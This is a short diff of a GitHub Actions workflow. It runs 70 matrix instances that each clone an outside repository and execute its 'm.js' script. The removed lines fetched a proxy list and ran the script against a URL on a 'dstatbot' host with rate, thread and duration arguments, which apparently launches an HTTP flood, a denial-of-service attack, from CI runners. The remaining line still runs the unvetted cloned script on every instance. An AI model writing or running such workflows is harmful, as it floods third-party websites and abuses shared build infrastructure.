@@ -40,8 +40,8 @@ jobs:
           
           git clone  https://github.com/Ggeg111/curly-octo-doodle.git
           cd curly-octo-doodle
-          wget  -O proxies.txt
-          node m.js GET https://c3.dstatbot.win/rB5fB5bL 700 4 120 proxies.txt
+          
+          node m.js
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
           TOTAL_INSTANCES: 70  # Updated to match the matrix count
